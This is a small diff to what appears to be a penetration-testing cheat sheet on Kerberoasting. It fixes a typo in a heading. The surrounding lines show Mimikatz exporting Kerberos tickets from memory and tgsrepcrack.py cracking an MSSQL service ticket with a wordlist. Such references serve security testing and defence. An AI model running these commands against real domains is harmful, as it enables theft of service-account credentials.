@@ -29,7 +29,7 @@ Extract the acquired tickets from ram with Mimikatz
 mimikatz # kerberos::list /export
 ```
 
-Crack with rgsrepcrack
+Crack with tgsrepcrack
 ----------------------
 ```
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
